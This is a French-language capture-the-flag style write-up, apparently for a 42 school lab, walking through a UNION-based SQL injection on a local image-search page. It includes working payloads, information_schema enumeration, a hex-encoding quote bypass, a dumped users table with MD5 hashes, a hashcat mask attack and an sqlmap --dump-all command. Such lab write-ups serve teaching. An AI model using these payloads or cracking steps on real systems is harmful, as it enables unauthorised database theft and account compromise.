
## test basic pour check si vulnerable aux injections
```sql
1 OR 1=1
```
renvoie toutes les images dans la db utilise par cette requette ```http://localhost:8080/index.php?page=searchimg&id=<PAYLOAD>```

## check combien de colonnes par tatonnement
```sql
1 ORDER BY 1
```
renvoie la premiere image de la db -> donc la db a plus d'une colonne 

```sql
1 ORDER BY 2
```
renvoie la premiere image de la db -> donc la db a plus de 2 colonne

```sql
1 ORDER BY 3
```
renvoie rien -> a surement throw une erreur dans le back -> il n'y a pas de troisieme colonne dans la db

maintenant on sait donc que toutes nos prochainse requettes doivent renvoyer 2 colonnes sinon elle ne pouront pas fonctionner

## check infos de la db (eg. version, ...)
```sql
1 UNION SELECT version(), user()
```
renvoie la premiere image grace a '1' -> puis execute l'instruction suivante 'UNION' etant comme un `&&` en bash -> return borntosec@localhost pour user() et 5.5.64-MariaDB-1ubuntu0.14.04.1 pour version()

## check tous les nom de toutes les db
```sql
1 UNION SELECT schema_name, 1 FROM information_schema.schemata
```
renvoie les nom de toutes les db du back, maintenant on sait quoi cibler -> Member_Sql_Injection PAR EXEMPLE

## lister toutes les tables de la db qui nous interesse
```sql
1 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema='Member_Sql_Injection'
```
ca, ca renvoi rien, pourquoi ?? par ce que les quotes sont surement transformees en '\ dans le back. on bypass ca en convertissant `users` en hexa ou en char(x, x, ...)

en hexa, 'Member_Sql_Injection' = 0x4d656d6265725f53716c5f496e6a656374696f6e

en char(), 'Member_Sql_Injection' = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)

```sql
1 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema=0x4d656d6265725f53716c5f496e6a656374696f6e
```
ca renvoie donc toutes les tables qui sont : `users` c'est tout...

## lister tous les champs de la table users
```sql
1 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name=0x7573657273
```
meme chose que au dessus mais cette fois avec la table `users (0x7573657273)` et on liste toutes les colonnes

| user_id | town | planet | country | last_name | first_name | Commentaire| countersign |
| :-----: | :---: | :---: | :-----: | :-------: | :--------: | :--------: | :---------: |
| ...     | ...   | ...   | ...     | ...       | ...        | ...        | ...         |

## lister toutes les valeures de toutes les colonnes
```sql
1 UNION SELECT user_id, town FROM Member_Sql_Injection.users
```
on sait qu'on a que 2 colonnes affichables, on peut donc récupérer les colonnes deux par deux (par exemple `user_id` et `town`).

| user_id | town | planet | country | last_name | first_name | Commentaire| countersign |
| :-----: | :---: | :---: | :-----: | :-------: | :--------: | :--------- | :---------: |
| 1 | Paris | EARTH | France | me | one | Je pense, donc je suis | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2 | Helsinki | Earth | Finlande | me | two | Aamu on iltaa viisaampi. | 60e9032c586fb422e2c16dee6286cf10 |
| 3 | Dublin | Earth | Irlande | me | three | Dublin is a city of stories and secrets. | e083b24a01c483437bcf4a9eea7c1b4d |
| 5 | 42 | 42 | 42 | GetThe | Flag | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |

## crack le mot de passe
d'abord on clone et compile hashcat
```bash
git clone https://github.com/hashcat/hashcat.git hashcat && cd hashcat && make
```
apres on decrypt le mot de passe par brute force avec les indices qu'on a, on sait que y'a des majuscules, surement des minuscules et pas de chiffres, c'est une supposition grace au commentaire dans la db.
surement pas plus de 8 caracteres aussi, ca reste un exo de 42, ils veulent pas qu'on passe 6 ans a crack un mot de passe.
surement pas de signes speciaux pour la meme raison.
```bash
./hashcat -m 0 -a 3 ../hash.txt -1 '?l?u' '?1?1?1?1?1?1?1?1' --increment -O
```
`-m 0` c'est le hash-type, ici md5 -> 0 on le sait grace a la taille des mot de passe hashes retrouves dans la db -> toujours 32 char en hexa donc compris entre 0-9 et a-f

`-a 3` c'est le mode d'attaque, ici brute force 

`path/vers/hash.txt` le fichier .txt qui contient les hash a crack

`-1 '?l?u'` pour cree un 'type' de char custom, ici charset 1, avec `?l` pour les minuscules et `?u` pour les majuscules

`'?1?1?1?1?1?1?1?1'` c'est le mask a tester, 8 caracteres de notre charset 1 (maj ou min)

`--increment` on a cree un mask de 8 caractere mais on ne sait pas quelle taille fait le mot de passe, donc utilise cet argument pour tester toutes les tailles de mot de passe entre 1 et la taille du mask

`-O` optimized kernels -> ca va vite

## dump
avec tout ca on peut facilement extraire toutes les valeures de toutes les colonnes de toutes les tables facilement. pour economiser du temps j'ai dump tout ca avec sqlmap. le sujet dit "You cannot use scripts such as sqlmap to make exploitation look trivial". etant donne que j'ai explique comment faire sans et que c'est uniquement pour eviter de faire 300 requettes a la main. voila voila
```bash
gcl https://github.com/sqlmapproject/sqlmap.git sqlmap
```
```bash
python3 sqlmap/sqlmap.py -u "http://localhost:8080/index.php?page=searchimg&id=1&Submit=Submit" -p id --dbms=MySQL --technique=U --dump-all
```
on obtient donc le fichier `log.txt` qui contient toutes les tables bien presentees.

# annexe
### ORDER BY
La commande ORDER BY permet de trier les lignes dans un résultat d’une requête SQL. Il est possible de trier les données sur une ou plusieurs colonnes, par ordre ascendant ou descendant.

### UNION
La commande UNION de SQL permet de mettre bout-à-bout les résultats de plusieurs requêtes utilisant elles-même la commande SELECT. C’est donc une commande qui permet de concaténer les résultats de 2 requêtes ou plus.

### version()
Dans le langage SQL, la fonction VERSION() permet de retourner la version du Système de Gestion de Base de Données (SGBD). Cette fonction permet de savoir exactement la version du système utilisé.

### user()
The USER() function returns the current user name and host name for the MySQL connection.

### SELECT
L’utilisation la plus courante de SQL consiste à lire des données issues de la base de données. Cela s’effectue grâce à la commande SELECT, qui retourne des enregistrements dans un tableau de résultat. Cette commande peut sélectionner une ou plusieurs colonnes d’une table.

### information_schema
information_schema est eune base de données système cachée dans MySQL/MariaDB qui contient toutes les métadonnées du serveur

### schemata
schemata est la table spécifique de la base système information_schema qui liste les bases de données existantes.

### sources
1. https://sql.sh/cours/order-by
2. https://sql.sh/cours/union
3. https://sql.sh/fonctions/version
4. https://www.w3schools.com/sql/func_mysql_user.asp
5. https://sql.sh/cours/select
6. https://docs.databricks.com/aws/en/sql/language-manual/sql-ref-information-schema
7. https://weakpass.com/